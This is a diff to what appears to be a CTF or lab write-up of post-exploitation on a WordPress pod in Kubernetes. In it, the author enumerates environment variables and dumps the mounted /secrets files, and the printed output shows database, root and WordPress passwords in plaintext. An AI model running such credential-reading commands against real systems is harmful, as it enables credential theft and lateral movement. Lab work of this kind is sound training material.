@@ -295,8 +295,233 @@ $st->execute(); echo "Rows updated: ".$st->affected_rows."\n";
 '
 ```
 
+i use ENV commnad for more enumeration in shell
+```bash
+<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ env
+env
+BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
+KUBERNETES_SERVICE_PORT_HTTPS=443
+WORDPRESS_SMTP_PASSWORD=
+WORDPRESS_SMTP_FROM_EMAIL=
+BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
+WEB_SERVER_HTTP_PORT_NUMBER=8080
+WORDPRESS_RESET_DATA_PERMISSIONS=no
+KUBERNETES_SERVICE_PORT=443
+WORDPRESS_EMAIL=user@example.com
+WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
+WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
+MARIADB_PORT_NUMBER=3306
+MODULE=wordpress
+WORDPRESS_SMTP_FROM_NAME=FirstName LastName
+HOSTNAME=beta-vino-wp-wordpress-66c7b89758-rpf65
+WORDPRESS_SMTP_PORT_NUMBER=
+BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
+WORDPRESS_EXTRA_CLI_ARGS=
+APACHE_BASE_DIR=/opt/bitnami/apache
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
+APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
+WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
+WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
+WORDPRESS_ENABLE_DATABASE_SSL=no
+WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
+APACHE_DAEMON_USER=daemon
+BITNAMI_ROOT_DIR=/opt/bitnami
+LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
+WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
+WORDPRESS_SCHEME=http
+WORDPRESS_LOGGED_IN_SALT=
+BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
+WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
+WORDPRESS_HTACCESS_OVERRIDE_NONE=no
+WORDPRESS_DATABASE_SSL_CERT_FILE=
+APACHE_HTTPS_PORT_NUMBER=8443
+PWD=/opt/bitnami/wordpress/wp-admin
+OS_FLAVOUR=debian-12
+WORDPRESS_SMTP_PROTOCOL=
+WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
+WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
+WORDPRESS_VOLUME_DIR=/bitnami/wordpress
+WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
+APACHE_BIN_DIR=/opt/bitnami/apache/bin
+BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
+WORDPRESS_PLUGINS=none
+WORDPRESS_FIRST_NAME=FirstName
+MARIADB_HOST=beta-vino-wp-mariadb
+WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
+WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
+WORDPRESS_DATABASE_USER=bn_wordpress
+PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
+WORDPRESS_AUTH_KEY=
+BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
+WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
+APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
+WORDPRESS_DATABASE_SSL_KEY_FILE=
+WORDPRESS_LOGGED_IN_KEY=
+APACHE_CONF_DIR=/opt/bitnami/apache/conf
+HOME=/
+KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
+WEB_SERVER_DAEMON_GROUP=daemon
+PHP_DEFAULT_POST_MAX_SIZE=80M
+WORDPRESS_ENABLE_HTTPS=no
+BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
+BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
+WORDPRESS_TABLE_PREFIX=wp_
+WORDPRESS_DATABASE_PORT_NUMBER=3306
+WORDPRESS_DATABASE_NAME=bitnami_wordpress
+LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
+APACHE_HTTP_PORT_NUMBER=8080
+WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
+WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
+WP_CLI_DAEMON_GROUP=daemon
+APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
+BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
+WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
+WORDPRESS_AUTO_UPDATE_LEVEL=none
+BITNAMI_DEBUG=false
+LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
+WORDPRESS_USERNAME=user
+BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
+WORDPRESS_ENABLE_XML_RPC=no
+WORDPRESS_BLOG_NAME=User's Blog!
+WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
+APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
+WORDPRESS_AUTH_SALT=
+APACHE_LOGS_DIR=/opt/bitnami/apache/logs
+WORDPRESS_EXTRA_INSTALL_ARGS=
+BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
+APACHE_DAEMON_GROUP=daemon
+WORDPRESS_NONCE_KEY=
+WEB_SERVER_HTTPS_PORT_NUMBER=8443
+WORDPRESS_SMTP_HOST=
+WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
+WORDPRESS_NONCE_SALT=
+APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
+APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
+WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
+BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
+WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
+WP_NGINX_SERVICE_SERVICE_PORT=80
+WORDPRESS_LAST_NAME=LastName
+WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
+WORDPRESS_ENABLE_MULTISITE=no
+WORDPRESS_SKIP_BOOTSTRAP=no
+WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
+SHLVL=2
+WORDPRESS_SECURE_AUTH_SALT=
+BITNAMI_VOLUME_DIR=/bitnami
+BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
+BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+BITNAMI_APP_NAME=wordpress
+WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
+APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
+BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
+WEB_SERVER_GROUP=daemon
+WORDPRESS_PASSWORD=O8F7KR5zGi
+KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
+APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
+WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
+WORDPRESS_SECURE_AUTH_KEY=
+BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
+APACHE_TMP_DIR=/opt/bitnami/apache/var/run
+APP_VERSION=6.8.1
+BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
+ALLOW_EMPTY_PASSWORD=yes
+WP_CLI_DAEMON_USER=daemon
+BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
+KUBERNETES_SERVICE_HOST=10.43.0.1
+KUBERNETES_PORT=tcp://10.43.0.1:443
+KUBERNETES_PORT_443_TCP_PORT=443
+WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
+WORDPRESS_VERIFY_DATABASE_SSL=yes
+OS_NAME=linux
+BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
+APACHE_SERVER_TOKENS=Prod
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
+WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
+WORDPRESS_ENABLE_REVERSE_PROXY=no
+LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
+WORDPRESS_SMTP_USER=
+WEB_SERVER_TYPE=apache
+WORDPRESS_MULTISITE_HOST=
+PHP_DEFAULT_MEMORY_LIMIT=512M
+WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
+WORDPRESS_DATABASE_SSL_CA_FILE=
+WEB_SERVER_DAEMON_USER=daemon
+OS_ARCH=amd64
+BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
+BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
+_=/usr/bin/env
+<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$
+```
 
+You have a read-only secrets tmpfs mounted at /secrets.
 
+that /secrets mount confirms you’re in k3s (containerd), not plain Docker. So a normal “docker escape” via /var/run/docker.sock isn’t possible here. The intended path on this box is a Kubernetes pivot.
+
+```bash
+ls -la /secrets
+for f in /secrets/* /secrets/**/* 2>/dev/null; do
+  [ -f "$f" ] && { echo "=== $f ==="; head -c 400 "$f"; echo; echo; }
+done
+
+<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ ls -la /secrets
+for f in /secrets/* /secrets/**/* 2>/dev/null; do
+  [ -f "$f" ] && { echo "=== $f ==="; head -c 400 "$f"; echo; echo; }
+done
+ls -la /secrets
+total 4
+drwxrwsrwt 3 root 1001  140 Nov  2 16:21 .
+drwxr-xr-x 1 root root 4096 Nov  2 16:21 ..
+drwxr-sr-x 2 root 1001  100 Nov  2 16:21 ..2025_11_02_16_21_24.4063521049
+lrwxrwxrwx 1 root 1001   32 Nov  2 16:21 ..data -> ..2025_11_02_16_21_24.4063521049
+lrwxrwxrwx 1 root 1001   23 Nov  2 16:21 mariadb-password -> ..data/mariadb-password
+lrwxrwxrwx 1 root 1001   28 Nov  2 16:21 mariadb-root-password -> ..data/mariadb-root-password
+lrwxrwxrwx 1 root 1001   25 Nov  2 16:21 wordpress-password -> ..data/wordpress-password
+<$ for f in /secrets/* /secrets/**/* 2>/dev/null; do
+bash: syntax error near unexpected token `2'
+< echo "=== $f ==="; head -c 400 "$f"; echo; echo; }
+<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ done
+bash: syntax error near unexpected token `done'
+<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ 
+```
+Dump the secrets you have (clean loop)
+```bash
+ls -la /secrets
+for f in /secrets/*; do
+  [ -f "$f" ] && { echo "=== $f ==="; head -c 200 "$f"; echo; echo; }
+done
+
+<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ ls -la /secrets
+for f in /secrets/*; do
+  [ -f "$f" ] && { echo "=== $f ==="; head -c 200 "$f"; echo; echo; }
+donels -la /secrets
+total 4
+drwxrwsrwt 3 root 1001  140 Nov  2 16:21 .
+drwxr-xr-x 1 root root 4096 Nov  2 16:21 ..
+drwxr-sr-x 2 root 1001  100 Nov  2 16:21 ..2025_11_02_16_21_24.4063521049
+lrwxrwxrwx 1 root 1001   32 Nov  2 16:21 ..data -> ..2025_11_02_16_21_24.4063521049
+lrwxrwxrwx 1 root 1001   23 Nov  2 16:21 mariadb-password -> ..data/mariadb-password
+lrwxrwxrwx 1 root 1001   28 Nov  2 16:21 mariadb-root-password -> ..data/mariadb-root-password
+lrwxrwxrwx 1 root 1001   25 Nov  2 16:21 wordpress-password -> ..data/wordpress-password
+<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ for f in /secrets/*; do
+>   [ -f "$f" ] && { echo "=== $f ==="; head -c 200 "$f"; echo; echo; }
+> 
+done
+=== /secrets/mariadb-password ===
+sW5sp4spa3u7RLyetrekE4oS
+
+=== /secrets/mariadb-root-password ===
+sW5sp4syetre32828383kE4oS
+
+=== /secrets/wordpress-password ===
+O8F7KR5zGi
+
+<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ 
+```
 
 
 
